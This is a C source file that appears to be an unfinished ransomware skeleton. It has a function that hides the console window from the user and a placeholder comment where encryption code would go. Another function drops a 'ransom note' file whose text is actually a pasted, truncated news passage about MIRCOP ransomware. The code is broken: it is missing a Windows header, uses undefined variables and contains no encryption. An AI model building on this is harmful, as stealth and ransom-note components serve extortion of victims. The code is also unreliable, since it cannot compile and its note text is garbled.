#include <stdio.h>
#include <stdlib.h>

int hideConsoleFirst(){
	HWND stealth; // Handle window , object to manpulate with windows
	AllocConsole(); // To get console
	stealth = FindWindowA("ConsoleWindowClass",NULL); // object stealth getting return value from findwindowa function 
	ShowWindow(stealth , 0) ; // fun get stealth object and hide this window with 0
	return 0;
}


// ENCRYPT FUN HERE

int displayWindow(){
	HWND hWndExample = CreateWindow("STATIC", "Text Goes Here", WS_VISIBLE | WS_CHILD | SS_LEFT, 10,10,100,100, hWnd, NULL, hInstance, NULL);		

	return 0;
}


int create_note(){
	char note[] = "scare tactic. Its ransom note, which shows a hooded figure in a Guy Fawkes mask, puts the blame on its victim, highlighting that the victim has “stolen” something from them. Instead of appending encrypted files with an extension, MIRCOP prepends files with the string “Lock.”. It also encrypts common folders. When files are opened, the file’s content is changed to unreadable characters. The ransom note prompts the victims to take action. On June 23, MIRCOP notably demanded one of the biggest single ransom amounts seen of late—a hefty sum of 48.48 bitcoins (around $32,239, at a rate of $665 for 1 bitcoin on July 15th), whi=";
	FILE *put_note = fopen("NOTE1.txt" , "w");
	int result = fputs(note , put_note); 
	if (result == EOF){
		printf("error to write");
		return -1;
	}
	fclose(put_note);
	return 0;
}




int main(){





	create_note();

	return 0;
}

